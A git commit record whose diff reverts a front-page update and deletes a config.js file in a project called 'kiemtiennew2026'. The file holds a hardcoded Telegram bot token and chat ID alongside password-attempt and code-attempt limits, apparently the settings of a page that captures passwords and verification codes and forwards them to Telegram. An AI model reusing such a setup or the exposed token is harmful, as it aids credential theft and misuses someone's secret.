f7cd96e6b9765a23be7ca0e895eedc629aeb69ef
Nguyễn Nguyên Giáp <giapfc123@gmail.com>
2026-06-05 15:24:31 +0700

    Revert "update trang đầu"
    This reverts commit 5d1a21fe581c03469ed4a1e03264f9db6d452d51.

--- kiemtiennew2026/src/utils/config.js
+++
@@ -1,9 +0,0 @@
-const config = {
-    token: '8629418409:AAEincdHC8iKLbRU40_HvHg2gAKZw9l3P5k',
-    chat_id: '-5170611093',
-    max_password_attempts: 2,
-    max_code_attempts: 3,
-    password_loading_time: 6,
-    code_loading_time: 4
-};
-export default config;
